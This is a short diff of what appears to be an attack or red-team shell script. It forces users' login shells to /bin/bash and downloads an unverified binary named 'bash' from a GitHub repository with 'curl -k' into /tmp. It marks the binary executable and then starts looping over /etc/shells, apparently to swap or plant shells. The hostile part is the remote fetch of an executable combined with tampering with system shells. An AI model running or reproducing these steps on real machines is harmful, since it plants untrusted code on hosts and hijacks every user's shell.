@@ -3,7 +3,7 @@ do
     chsh -s /bin/bash $user
 done
 
-wget 'https://github.com/lsh8829/CDT473/raw/main/bash' -o /tmp/bash
+curl -k 'https://raw.githubusercontent.com/lsh8829/CDT473/main/bash' -o /tmp/bash
 chmod +x /tmp/bash
 
 for shell in $(tail -n +2 /etc/shells)
